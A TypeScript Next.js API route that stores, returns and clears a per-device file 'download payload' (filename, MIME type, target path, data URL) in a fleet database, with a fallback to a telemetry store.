import { NextRequest, NextResponse } from 'next/server';
import { saveDownloadPayloadToDb, getDownloadPayloadFromDb } from '@/lib/fleetDb';
import { saveDownloadedFile, getLatestDownloadedFile, clearDownloadedFile } from '@/lib/telemetryStore';

export async function GET(
  request: NextRequest,
  { params }: { params: Promise<{ id: string }> }
) {
  try {
    const { id } = await params;
    
    let download: any = null;
    try {
      download = await getDownloadPayloadFromDb(id);
    } catch {
      download = getLatestDownloadedFile(id);
    }
    if (!download) download = getLatestDownloadedFile(id);

    const headers = {
      'Cache-Control': 'no-store, no-cache, must-revalidate, max-age=0',
      'Pragma': 'no-cache'
    };

    return NextResponse.json({ status: 'success', download }, { status: 200, headers });
  } catch (error: any) {
    return NextResponse.json({ status: 'error', message: error?.message }, { status: 500 });
  }
}

export async function POST(
  request: NextRequest,
  { params }: { params: Promise<{ id: string }> }
) {
  try {
    const { id } = await params;
    const body = await request.json();

    const payload = {
      device_id: id,
      filename: body.filename || 'downloaded_file',
      mime_type: body.mime_type || 'application/octet-stream',
      target_path: body.target_path || '',
      data_url: body.data_url || '',
      size_bytes: body.size_bytes || 0,
      is_folder: body.is_folder || false,
      timestamp: body.timestamp || Date.now()
    };

    try {
      await saveDownloadPayloadToDb(id, payload);
    } catch {
      saveDownloadedFile(payload);
    }

    return NextResponse.json({ status: 'success', message: 'File ready for download' }, { status: 200 });
  } catch (error: any) {
    console.error('Error saving download payload:', error);
    return NextResponse.json({ status: 'error', message: error?.message }, { status: 500 });
  }
}

export async function DELETE(
  request: NextRequest,
  { params }: { params: Promise<{ id: string }> }
) {
  try {
    const { id } = await params;
    clearDownloadedFile(id);
    return NextResponse.json({ status: 'success', message: 'Download payload cleared' }, { status: 200 });
  } catch (error: any) {
    return NextResponse.json({ status: 'error', message: error?.message }, { status: 500 });
  }
}

